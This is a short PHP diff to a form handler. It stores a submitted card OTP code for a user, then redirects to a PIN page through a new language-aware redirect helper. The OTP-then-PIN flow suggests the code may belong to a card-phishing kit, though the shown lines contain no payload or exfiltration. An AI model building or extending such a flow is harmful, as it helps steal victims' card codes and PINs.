@@ -1,5 +1,6 @@
 <?php
 session_start();
+require_once '../includes/lang.php';
 require_once('../dashboard/init.php');
 
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
@@ -36,7 +37,7 @@ $saved = $User->insertCardOTP($cardId, $userId, $otpCode);
 
 if ($saved) {
     // ✅ إعادة التوجيه إلى pin.php مع user ID
-    header('Location: ../pin.php?id=' . $userId);
+    header('Location: ' . lang_redirect_after_tele('pin.php') . '?id=' . $userId);
     exit;
 } else {
     http_response_code(500);
